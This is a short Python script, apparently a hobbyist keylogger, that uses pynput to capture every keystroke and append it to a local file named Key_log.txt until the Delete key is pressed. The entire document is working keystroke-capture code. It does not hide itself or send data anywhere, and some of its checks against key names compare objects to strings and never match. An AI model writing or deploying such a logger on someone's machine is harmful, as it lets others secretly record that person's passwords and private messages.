from pynput import keyboard



def OnPress(key) : 
    

    if key == keyboard.Key.space:
        key = ' '
    if key == 'key.shift_r':
        key = ''
    if key == 'Key.ctrl_l':
        key = ''
    elif key == keyboard.Key.enter:
        print ()
    elif key == keyboard.Key.delete : # Stop listener (you can choose what you want)
        return False



    with open("Key_log.txt", 'a') as file :
        file.write(f'Key Pressed: {key}\n')
    
        
with keyboard.Listener (
    on_press = OnPress) as listener :
    listener.join()













